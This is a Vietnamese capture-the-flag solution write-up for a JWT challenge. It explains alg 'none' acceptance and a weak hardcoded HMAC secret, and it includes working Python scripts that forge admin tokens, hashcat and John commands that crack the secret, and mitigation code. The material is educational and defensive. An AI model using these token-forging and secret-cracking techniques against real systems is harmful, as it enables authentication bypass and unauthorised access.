# Thử thách 23: JWTForge — Giải pháp

## Loại lỗ hổng
**JWT Algorithm Confusion (Khai thác lỗ hổng thuật toán JWT None)**  
*Lỗ hổng bổ sung: HMAC Secret quá yếu - có thể bị Brute-force*

## Mô tả
Hệ thống cấp phát JWT với vai trò mặc định là `role: "user"`. Tuy nhiên, endpoint `/flag` lại yêu cầu `role: "admin"`. Có hai lỗ hổng riêng biệt cho phép kẻ tấn công vượt qua bước kiểm tra quyền này:

1. **Nhầm lẫn thuật toán (Algorithm Confusion)**: Hệ thống ngây thơ chấp nhận thuật toán `alg: "none"` — tức là không thèm kiểm tra chữ ký. Bất kỳ ai cũng có thể giả mạo token với Payload tùy ý.
2. **Khóa bí mật (Secret) quá yếu**: Chuỗi HMAC-SHA256 Secret được thiết lập cứng (hardcoded) là `"supersecret"` — từ khóa này nằm chễm chệ trong hầu hết các bộ từ điển dò pass cơ bản.

## Mã nguồn chứa lỗ hổng

```python
# verify_token() — Chấp nhận alg:none mà không xác minh chữ ký
alg = header.get("alg", "")
if alg == "none":
    return payload, None   # ← Trả về payload luôn mà không thèm verify!

# create_token() — Sử dụng Secret key quá yếu được thiết lập cứng
JWT_SECRET = "supersecret"
```

## Khai thác (Exploit)

### Phương pháp 1 - Khai thác thuật toán None (Không cần Brute-force)

Cấu trúc chuẩn của một JWT bao gồm 3 phần: `header.payload.signature` (mỗi phần được mã hóa bằng Base64URL).

**Bước 1**: Giải mã Guest token mà bạn được cấp trên trang chủ.

```python
import base64, json

token = "<paste token từ trang web vào đây>"
parts = token.split(".")

def b64d(s):
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

header  = json.loads(b64d(parts[0]))
payload = json.loads(b64d(parts[1]))
print(header)   # {"alg": "HS256", "typ": "JWT"}
print(payload)  # {"sub": "guest", "role": "user", "iat": 1700000000}
```

**Bước 2**: Giả mạo một token cấp quyền Admin với thuật toán `alg: none`.

```python
import base64, json

def b64e(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "iat": 1700000000}

h = b64e(json.dumps(header, separators=(",", ":")))
p = b64e(json.dumps(payload, separators=(",", ":")))

forged = f"{h}.{p}."  # Bỏ trống phần chữ ký phía sau dấu chấm thứ 2
print(forged)
```

**Bước 3**: Gửi token giả mạo tới endpoint `/flag`.

```bash
curl http://<host>:5000/flag \
  -H "Authorization: Bearer <forged_token>"
```

### Phương pháp 2 - Brute-force bẻ khóa Secret bằng Hashcat/John

```bash
# Lưu token gốc vào một file
echo "<token>" > jwt.txt

# Bẻ khóa bằng hashcat (mode 16500 = JWT HS256)
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Hoặc bằng john the ripper
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
# Kết quả thu được → supersecret
```

Sau khi có Secret, bạn có thể tự tin rèn một token chuẩn HS256 với quyền Admin hợp lệ:

```python
import base64, json, hmac, hashlib

SECRET = "supersecret"

def b64e(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header  = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "iat": 1700000000}

h = b64e(json.dumps(header, separators=(",", ":")))
p = b64e(json.dumps(payload, separators=(",", ":")))

sig_input = f"{h}.{p}".encode()
sig = hmac.new(SECRET.encode(), sig_input, hashlib.sha256).digest()

token = f"{h}.{p}.{b64e(sig)}"
print(token)
```

## Khai thác tự động bằng Script (Phương pháp 1)

```python
import requests, base64, json

TARGET = "http://<host>:5000"

def b64e(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# Tạo token admin với alg:none
header  = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "iat": 1700000000}
h = b64e(json.dumps(header, separators=(",", ":")))
p = b64e(json.dumps(payload, separators=(",", ":")))
forged = f"{h}.{p}."

print(f"[*] Token giả mạo: {forged}")

r = requests.get(f"{TARGET}/flag", headers={"Authorization": f"Bearer {forged}"})
data = r.json()
print(f"[+] Phản hồi: {data}")
if "flag" in data:
    print(f"[+] Flag: {data['flag']}")
```

## Biện pháp phòng ngừa (Mitigation)

```python
# 1. Từ chối hoàn toàn thuật toán alg:none
ALLOWED_ALGORITHMS = {"HS256"}

def verify_token(token):
    header = json.loads(b64url_decode(token.split(".")[0]))
    if header.get("alg") not in ALLOWED_ALGORITHMS:
        return None, "Thuật toán không được phép"
    # ... phần code kiểm tra chữ ký ở dưới

# 2. Sinh Secret Key bằng cơ chế ngẫu nhiên bảo mật (tối thiểu 32 bytes)
import secrets
JWT_SECRET = secrets.token_hex(32)   # Phải lưu ở biến môi trường env, không hardcode vào code

# 3. Sử dụng các thư viện chuẩn mực đã được kiểm định
import jwt as pyjwt

def verify_token(token):
    return pyjwt.decode(token, JWT_SECRET, algorithms=["HS256"])
```

## Sơ đồ đòn tấn công

```text
Server cấp phát token:  {"alg":"HS256"}.{"role":"user"}.HMAC_SIGNATURE

Kẻ tấn công sửa lại token:
  header  → {"alg":"none"}
  payload → {"role":"admin"}
  sig     → "" (xóa rỗng)

Server xác thực lỗi logic:
  alg == "none" → Bỏ qua khâu check chữ ký ✓
  payload["role"] == "admin" → Tin tưởng mù quáng và trả về FLAG ✓
```

## Bài học rút ra
- **Tuyệt đối KHÔNG BAO GIỜ chấp nhận `alg:none`** — Đây là một lỗ hổng CVE rất nổi tiếng (CVE-2015-9235) từng làm mưa làm gió trong hàng loạt thư viện JWT.
- Phải luôn sử dụng một Secret Key đủ dài, ngẫu nhiên mạnh (256-bit) và sinh ra lúc deploy hệ thống.
- Hãy xài các thư viện JWT uy tín và đã được "thử lửa" trong thực chiến (`python-jose`, `PyJWT`) và bắt buộc khai báo White-list danh sách thuật toán cụ thể ở hàm verify.
- Với các kiến trúc Microservices phân tán, ưu tiên sử dụng chuẩn thuật toán bất đối xứng (như `RS256`).
